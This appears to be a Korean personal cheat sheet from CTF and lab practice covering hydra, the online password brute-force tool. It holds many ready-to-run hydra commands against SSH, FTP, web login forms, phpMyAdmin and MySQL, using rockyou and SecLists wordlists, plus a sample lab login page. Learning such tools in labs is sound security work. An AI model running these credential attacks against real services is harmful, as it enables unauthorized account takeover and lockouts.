# hydra

- 온라인 로그인 브루트포스 도구 hydra — -l/-L·-P로 계정·패스워드 리스트를 넣고 ssh·ftp·http-post-form 등 서비스 모듈로 대상에 직접 인증을 시도(^USER^·^PASS^ 치환, F= 실패 문구 판정)
- SSH·FTP·웹 로그인 폼·MySQL 등 살아있는 서비스에 자격증명 브루트포스를 시도할 때. 오프라인 해시 크래킹(hashcat)과 달리 네트워크 서비스 대상
- 대상 서비스 포트 접근 가능(22/21/80 등), hydra 설치(apt install hydra), 워드리스트(rockyou.txt·SecLists) — -t 스레드 과다 시 차단·계정 잠금 위험, 세션 쿠키 필요 폼은 H=Cookie: 헤더 추가

```bash
hydra -l <username> -P <full path to pass> 10.201.20.141 -t 4 ssh

apt install seclists
apt install wordlists

# 주요 옵션
# -l : 단일 사용자명
# -L : 사용자명 리스트
# -P : 패스워드 리스트
# -s : 포트 지정
# -V : 시도하는 계정/패스워드 실시간 출력
# -t : 동시 스레드 수 (기본 16)
# -f : 첫 성공시 멈춤

# 설치 (kali는 기본 설치)
sudo apt update && sudo apt install -y hydra

# 안전하게 -t 4
hydra -l root -P passwords.txt 10.201.20.141 -t 4 ssh
hydra -l <username> -P <full path to pass> 10.201.106.187 -t 4 ssh

sudo hydra <username> <wordlist> 10.201.20.141 http-post-form "<path>:<login_credentials>:<invalid_response>"
# ssh brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
hydra -l <username> -P <wordlist> 10.201.20.141 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
# ftp brute force
hydra -l anonymous -P pass.txt ftp://10.10.10.10

# http-post-form (로그인 폼)
hydra -L user.txt -P pass.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=로그인실패문구"
hydra -l think -P password.txt ssh://10.10.67.138 --t 40 -v
hydra -l scr1ptkiddy -P passwords.txt 10.10.136.50 http-post-form \
"/silverpeas/jsp/login.jsp:username=^USER^&password=^PASS^&DomainId=0:Location"

# 결과 예시
# [22][ssh] host: 10.10.10.10 login: root password: 123456
```

<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
</head>
<body>

  <div class="container">
  </br><img width="300" src="assets/portal.jpg"><h3>Portal Login Page</h3></br>
    <form name="input" action="" method="post">
      <label for="username">Username:</label><input type="text" class="form-control" value="" id="username" name="username" />
      <label for="password">Password:</label><input type="password" class="form-control" value="" id="password" name="password" />

    </br><input type="submit" value="Login" class="btn btn-success" name="sub"/>
    </form>

  </div>

</body>
</html>

sudo hydra -l R1ckRul3s -P rockyou.txt 10.65.165.164 http-post-form "/login.php:username=^USER^&password=^PASS^&submit=Login:F=login failed"

- burpsuite form
  username=test&password=test2&s_mod=login&s_pg=index

```bash
hydra -L /usr/share/wordlists/seclists/Passwords/Common-Credentials/common-passwords-win.txt -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/common-passwords-win.txt 192.168.110.101 http-post-form "/login/index.php:username=^USER^&password=^PASS^:F=로그인실패문구"
```

HYDRA_PROXY=http://192.168.199.189:3128 hydra -L users.txt -P passes.txt -s 8080 127.0.0.1 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=2&target=index.php&token=TOKEN:F=Access denied" -t 4 -f -V

- DB bruteforce with proxy

HYDRA_PROXY=http://192.168.199.189:3128 hydra -l root -P passes.txt -s 3307 127.0.0.1 mysql -t 4 -f -V
